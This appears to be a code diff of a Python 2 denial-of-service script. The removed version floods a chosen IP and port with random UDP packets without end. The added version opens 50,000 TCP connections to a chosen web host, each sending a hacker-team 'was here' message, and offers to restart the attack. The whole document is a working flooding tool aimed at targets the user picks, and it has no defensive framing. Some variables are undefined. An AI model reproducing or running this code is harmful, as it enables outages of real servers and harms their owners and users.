@@ -1,15 +1,9 @@
-import sys
-import os
 import time
 import socket
-import random
-import datetime
-
-
-############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(10000)
-############
+import os
+import sys
+import string
+#The green reaper 
 
 os.system("clear")
 time = time.ctime(time.time())
@@ -26,23 +20,39 @@ print """\033[31;1m
 \033[32;1mType      : DDOS
 ----------------------------------------------
 """
-print
-ip = raw_input("\033[32;1mIP Target : ")
-port = input  ("\033[32;1mPort      : ")
-os.system("clear")
-sent = 0 
-    
-while True:
-        
-        sock.sendto(bytes, (ip, port)) 
-        
-        port = port + 0
-        
-        sent = sent + 1 
-        
-        print "\033[32;1mMenyerang \033[31;1m%s \033[32;1mdengan port \033[33;1m%s  \033[32;1mbytes \033[34;1m%s"%(ip, port, sent)
-
-
-if __name__ == '__main__': 
-        
-        main()
+print baner
+def restart_program():
+    python = sys.executable
+    os.execl(python, python, * sys.argv)
+curdir = os.getcwd()
+print ("\033[1;91minput web url \033[1;95m[ex : www.Example.com ]")
+host=raw_input( "\033[1;94mAMR@root : " )
+print ("\033[1;91minput port \033[1;95m[ex : 8080 ]")
+port=input("\033[1;94mAMR@root : ")
+connect=50000
+ip = socket.gethostbyname( host )
+print ( "\033[1;91m Attacking \033[1;93m[" + host + "]" )
+print ( "\033[1;91m Attack to ip \033[1;93m["+ ip + "]" )
+message=("ATTACK OF CYBER & BADBUNNY CYBER TEAM & THE BLACK HORSE SYSTEM WAS HERE...")
+print ("\033[1;91mFIRE..............................")
+def dos():
+    #pid = os.fork()
+    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        ddos.connect((host, 80))
+        ddos.send( message )
+        ddos.sendto( message, (ip, port) )
+        ddos.send( message );
+    except socket.error, msg:
+        print("\033[1;91m ...no connection to [" + ip + "] ...")
+    print ( "\033[1;92m ...start sending the coffin to [" + ip + "] ...")
+    ddos.close()
+for i in range(1, connect):
+    dos()
+print("Ddos anda telah berhenti.........")
+if __name__ == "__main__":
+    answer = raw_input("Anda mau lanjut ddos ??? ketik fire untuk lanjut...")
+    if answer.strip() in "y Y fire Fire FIRE".split():
+        restart_program()
+    else:
+        os.system(curdir+"Deqmain.py")
